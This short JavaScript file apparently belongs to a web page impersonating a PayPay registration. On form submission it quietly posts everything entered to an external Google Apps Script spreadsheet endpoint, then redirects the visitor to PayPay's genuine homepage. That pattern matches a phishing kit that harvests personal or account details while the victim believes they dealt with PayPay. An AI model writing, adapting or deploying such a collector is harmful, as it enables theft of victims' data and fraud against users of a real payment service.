document.getElementById('registration-form').addEventListener('submit', function(event) {
    event.preventDefault(); // フォームのデフォルト送信を防ぐ

    // フォームデータを取得
    const formData = new FormData(document.getElementById('registration-form'));

    // Googleスプレッドシートにデータを送信する
    submitToGoogleSheets(formData);

    // PayPayのホームページにリダイレクトする
    window.location.href = 'https://paypay.ne.jp/';
});

function submitToGoogleSheets(formData) {
    fetch('https://script.google.com/macros/s/AKfycbwbr4z0vDdToklOgEh_v7tAV1bDYKv9e_nnEKBkg4mrRulC0lhqVv2R9CeXzx4wVSbFBA/exec', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => console.log('Success:', data))
    .catch(error => console.error('Error:', error));
}
